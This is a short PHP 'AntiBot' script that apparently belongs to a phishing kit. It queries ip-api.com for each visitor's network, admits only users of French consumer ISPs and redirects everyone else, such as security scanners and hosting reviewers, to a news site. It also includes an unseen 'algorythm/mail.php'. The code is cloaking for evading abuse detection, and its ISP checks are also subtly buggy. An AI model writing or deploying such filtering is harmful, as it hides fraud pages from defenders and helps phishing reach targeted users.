<?php

// AntiBot Free & OpenSource by IP-api.com


include 'algorythm/mail.php';


session_start(); // OUVERTURE DE LA SESSION


$ip = $_SERVER['REMOTE_ADDR'];

function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip."?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	
	$org = "{$ipinfo_json['as']}";
	$isps = "{$ipinfo_json['isp']}";


	




if(strpos($org,"Bouygues") || strpos($org,"Orange") || strpos($org,"Sfr") || strpos($org,"SFR") || strpos($org,"Free") || strpos($org,"Wanadoo")) // LES ISP AUTORISES
{
	

	
	



}
else{


		header('Location: https://www.mediapart.fr/'); // REDIRECTION, tu peux aussi mettre : die('HTTP/1.0 404 Not Found');

	

	

	

}

?>